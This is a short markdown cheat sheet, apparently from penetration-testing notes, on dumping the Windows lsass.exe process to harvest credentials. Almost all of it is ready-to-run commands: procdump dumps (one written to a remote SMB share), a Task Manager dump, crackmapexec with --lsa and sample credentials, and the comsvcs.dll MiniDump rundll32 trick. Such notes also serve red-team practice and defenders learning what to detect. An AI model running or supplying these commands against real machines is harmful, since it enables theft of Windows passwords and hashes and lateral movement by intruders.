## Dumping `lsass.exe`

### Procdump:
- We can dump `lsass.exe` using `procdump.exe`
```
procdump.exe -accepteula -ma lsass.exe lsass_dump
procdump.exe (ps lsass).id data -ma
```
- Also can be done using PID
```
get-process lsass
OR
tasklist | findstr lsass

procdump.exe -accepteula -ma 580 out.dmp
```
- Also can be done to an external share
```
procdump.exe (ps lsass).id \\192.168.1.117\share\data -ma
```

### Task Manager:
- We can dump using Task Manager
```
> lsass.exe
> Create Dump File
```

### Crackmapexec:
- Using `crackmapexec`
```
crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa
```

### Comsvcs:
- Dump using lsass PID
```
Get-Process lsass
 C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 996 lsass.dmp full
```
